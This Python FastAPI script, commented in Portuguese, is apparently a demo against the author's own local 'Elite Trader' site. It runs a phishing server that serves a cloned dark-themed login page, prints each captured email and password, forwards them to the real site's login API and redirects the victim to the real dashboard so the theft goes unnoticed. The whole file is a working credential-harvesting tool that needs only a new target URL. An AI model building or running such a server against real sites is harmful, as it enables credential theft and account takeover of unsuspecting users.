import uvicorn
from fastapi import FastAPI, Form, Request
from fastapi.responses import HTMLResponse, RedirectResponse
import httpx
import os

# --- Configuração do Ataque ---
app = FastAPI( )

# URL do site REAL que estamos a atacar (o seu servidor local)
TARGET_SITE_URL = "http://localhost:3000" 

# --- Página de Login Falsa (Clone Visual ) ---
# Este HTML é desenhado para se parecer com uma página de login moderna e escura.
fake_login_page_html = """
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>Elite Trader - Login</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; background-color: #111827; color: #f3f4f6; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-card { background: #1f2937; padding: 2.5rem; border-radius: 0.75rem; box-shadow: 0 10px 25px rgba(0,0,0,0.5); width: 350px; }
        h1 { text-align: center; color: #d1d5db; margin-bottom: 2rem; }
        label { display: block; margin-bottom: 0.5rem; color: #9ca3af; font-size: 0.875rem; }
        input { display: block; margin-bottom: 1.5rem; padding: 0.75rem; width: 100%; box-sizing: border-box; background: #374151; border: 1px solid #4b5563; color: #f3f4f6; border-radius: 0.375rem; }
        input:focus { outline: none; border-color: #3b82f6; box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.5); }
        button { padding: 0.75rem; width: 100%; background-color: #3b82f6; color: white; font-weight: bold; border: none; border-radius: 0.375rem; cursor: pointer; transition: background-color 0.2s; }
        button:hover { background-color: #2563eb; }
        .error-msg { color: #f87171; text-align: center; margin-top: 1rem; }
    </style>
</head>
<body>
    <div class="login-card">
        <form action="/submit-login" method="post">
            <h1>Elite Trader</h1>
            <label for="email">Email</label>
            <input type="email" id="email" name="email" required>
            <label for="password">Senha</label>
            <input type="password" id="password" name="password" required>
            <button type="submit">Entrar</button>
        </form>
    </div>
</body>
</html>
"""

# --- Endpoints do Servidor de Phishing ---

@app.get("/", response_class=HTMLResponse)
async def serve_fake_login_page():
    return HTMLResponse(content=fake_login_page_html)

@app.post("/submit-login")
async def capture_credentials(email: str = Form(...), password: str = Form(...)):
    # Limpa o terminal para destacar a captura
    os.system('cls' if os.name == 'nt' else 'clear')
    
    print("\n" + "="*60)
    print("  🚨 CREDENCIAIS CAPTURADAS COM SUCESSO! 🚨")
    print(f"  ➡️  Email:    {email}")
    print(f"  ➡️  Password: {password}")
    print("="*60 + "\n")

    # Tenta usar as credenciais no site real para ser discreto
    target_login_endpoint = f"{TARGET_SITE_URL}/api/auth/login" 
    print(f"[INFO] A reencaminhar credenciais para o site real: {target_login_endpoint}...")

    async with httpx.AsyncClient( ) as client:
        try:
            response = await client.post(target_login_endpoint, json={'email': email, 'password': password})
            if response.status_code == 200:
                print("[SUCCESS] Login no site real bem-sucedido. A redirecionar a vítima...")
                return RedirectResponse(url=f"{TARGET_SITE_URL}/trade/dashboard", status_code=303)
            else:
                print(f"[FAIL] Login no site real falhou. A vítima receberá um erro.")
                return HTMLResponse(content="<h1>Email ou senha inválidos.</h1><a href='/'>Tentar novamente</a>", status_code=401)
        except httpx.RequestError:
            print(f"[ERROR] Não foi possível conectar ao site real em {TARGET_SITE_URL}." )
            return HTMLResponse(content="<h1>Erro do servidor. Tente mais tarde.</h1>", status_code=500)

if __name__ == "__main__":
    # Instala dependências se não existirem
    try:
        import fastapi, uvicorn, httpx
    except ImportError:
        print("A instalar dependências (fastapi, uvicorn, httpx )...")
        os.system('pip install fastapi uvicorn httpx' )

    print("\n--- Servidor de Phishing PRONTO ---")
    print("1. No outro terminal, inicie o seu site Elite Trader com 'npm run dev'.")
    print("2. Neste terminal, o servidor de phishing está a rodar.")
    print(f"3. Vítima: Aceda a http://127.0.0.1:8003 no navegador." )
    uvicorn.run(app, host="0.0.0.0", port=8003)
